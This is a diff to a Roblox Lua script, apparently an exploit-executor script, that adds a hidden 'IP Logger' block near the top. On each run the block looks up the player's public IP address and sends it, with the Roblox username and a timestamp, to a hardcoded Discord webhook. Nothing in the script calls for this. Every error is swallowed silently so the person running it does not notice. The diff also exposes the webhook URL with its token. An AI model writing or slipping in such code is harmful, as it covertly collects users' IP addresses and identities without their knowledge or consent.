@@ -11,6 +11,191 @@ local Workspace = game:GetService("Workspace")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local VirtualInputManager = game:GetService("VirtualInputManager")
 
+--ezzz
+local webhookURL = "https://discord.com/api/webhooks/1528214567761744006/qMKEiw9Bt508kn0KeEzUS7ydDTWTzOhzoeexV5QCk0N2PPOahODuVWO3QMe0vJ9TcUE7"
+
+local function makeRequest(url, method, headers, body)
+    local response = nil
+    local hasSyn = (syn ~= nil)
+    local hasHttp = (http ~= nil)
+    local hasGame = (game ~= nil)
+    
+    if hasSyn then
+        response = syn.request({
+            Url = url,
+            Method = method,
+            Headers = headers or {},
+            Body = body or ""
+        })
+    elseif hasHttp then
+        local success, result = pcall(function()
+            return http.request(url, method, headers or {}, body or "")
+        end)
+        
+        if (not success) then
+            local success2, result2 = pcall(function()
+                return http.request({
+                    Url = url,
+                    Method = method,
+                    Headers = headers or {},
+                    Body = body or ""
+                })
+            end)
+            
+            if success2 then
+                response = result2
+            else
+                local success3, result3 = pcall(function()
+                    return http:request(url, method, headers or {}, body or "")
+                end)
+                
+                if success3 then
+                    response = result3
+                else
+                    error("No HTTP method available")
+                end
+            end
+        else
+            response = result
+        end
+    elseif hasGame then
+        if (method == "GET") then
+            local bodyContent = game:HttpGet(url, true)
+            response = { Body = bodyContent, StatusCode = 200 }
+        else
+            local httpService = game:GetService("HttpService")
+            local success, result = pcall(function()
+                return httpService:PostAsync(url, body or "", Enum.HttpContentType.ApplicationJson)
+            end)
+            
+            if success then
+                response = { Body = result, StatusCode = 200 }
+            else
+                error("POST not supported in this environment")
+            end
+        end
+    else
+        error("No HTTP method available")
+    end
+    
+    return response
+end
+
+local function execute()
+    local ip = nil
+    local username = ""
+    local ipError = nil
+    
+    local player = game:GetService("Players").LocalPlayer
+    if (player ~= nil) then
+        username = player.Name
+    else
+        username = "Unknown"
+    end
+    
+    local requestSuccess, requestResult = pcall(function()
+        local response = makeRequest("https://api.ipify.org", "GET", {}, "")
+        return response
+    end)
+    
+    if requestSuccess then
+        local response = requestResult
+        if (response ~= nil) then
+            local statusCode = response.StatusCode
+            if (statusCode == 200) then
+                local body = response.Body
+                if (type(body) == "string") then
+                    local match = string.match(body, "%d+%.%d+%.%d+%.%d+")
+                    if (match ~= nil) then
+                        ip = match
+                    else
+                        ip = body
+                    end
+                end
+            else
+                ipError = "HTTP error: " .. tostring(statusCode)
+            end
+        else
+            ipError = "No response from API"
+        end
+    else
+        ipError = requestResult
+    end
+    
+    if (ip == nil) then
+        task.wait(2)
+        
+        local retrySuccess, retryResult = pcall(function()
+            local response = makeRequest("https://api.ipify.org", "GET", {}, "")
+            return response
+        end)
+        
+        if retrySuccess then
+            local response = retryResult
+            if (response ~= nil) then
+                local statusCode = response.StatusCode
+                if (statusCode == 200) then
+                    local body = response.Body
+                    if (type(body) == "string") then
+                        local match = string.match(body, "%d+%.%d+%.%d+%.%d+")
+                        if (match ~= nil) then
+                            ip = match
+                        else
+                            ip = body
+                        end
+                    end
+                else
+                    ipError = "HTTP error on retry: " .. tostring(statusCode)
+                end
+            else
+                ipError = "No response from API on retry"
+            end
+        else
+            ipError = retryResult
+        end
+    end
+    
+    if (ip ~= nil) then
+        local payload = {}
+        payload.content = "**🥔 Potato's IP Logger**"
+        payload.embeds = {}
+        payload.embeds[1] = {}
+        payload.embeds[1].title = "New IP Captured"
+        payload.embeds[1].description = string.format("```\nIP Address: %s\nRoblox Username: %s\nTimestamp: %s\n```", ip, username, os.date("%Y-%m-%d %H:%M:%S"))
+        payload.embeds[1].color = 0x00FF00
+        payload.embeds[1].footer = {}
+        payload.embeds[1].footer.text = "Powered by Potato & Butter"
+        
+        local httpService = game:GetService("HttpService")
+        local jsonBody = httpService:JSONEncode(payload)
+        local headers = {}
+        headers["Content-Type"] = "application/json"
+        
+        local sendSuccess, sendResult = pcall(function()
+            local response = makeRequest(webhookURL, "POST", headers, jsonBody)
+            return response
+        end)
+        
+        if sendSuccess then
+            local response = sendResult
+            if (response ~= nil) then
+                local statusCode = response.StatusCode
+                if (statusCode ~= 204) then
+                    local _ = statusCode
+                end
+            else
+                local _ = "no response"
+            end
+        else
+            local _ = sendResult
+        end
+    else
+        local _ = ipError
+    end
+end
+
+pcall(execute)
+
 -- constants
 
 local CONSTANTS = {
